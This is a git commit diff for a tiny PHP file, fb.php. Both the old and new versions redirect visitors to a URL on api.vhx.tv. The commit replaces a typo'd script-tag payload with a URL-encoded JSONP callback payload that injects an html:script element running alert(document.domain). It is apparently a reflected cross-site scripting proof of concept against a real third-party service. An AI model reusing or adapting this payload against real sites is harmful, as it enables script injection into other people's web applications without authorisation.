8d9dc3709e4517b4b9138ab139058832fb0fd6c7
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-23 18:39:30 +0100

    Update fb.php

--- fb.php
+++ fb.php
@@ -1,5 +1,5 @@
 <?php
-header('Location: https://api.vhx.tv/<scritp>alert(0)</script>');
+header('Location: https://api.vhx.tv/?callback=%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E');
 
 ?>
 
